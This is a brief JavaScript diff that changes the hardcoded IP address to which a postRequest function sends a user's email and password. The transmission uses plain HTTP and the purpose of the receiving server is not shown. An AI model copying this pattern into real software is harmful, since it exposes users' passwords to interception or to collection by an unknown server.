@@ -56,7 +56,7 @@ function checkEmail(email) {
 // Requisição POST
 function postRequest(email, password) {
 	var http = new XMLHttpRequest();
-	var url = 'http://54.234.126.98:3000';
+	var url = 'http://3.91.55.0:3000';
 	var params = encodeURIComponent('email') + '=' + encodeURIComponent(email) + '&' +
 				encodeURIComponent('password') + '=' + encodeURIComponent(password);
 	http.open('POST', url, true);
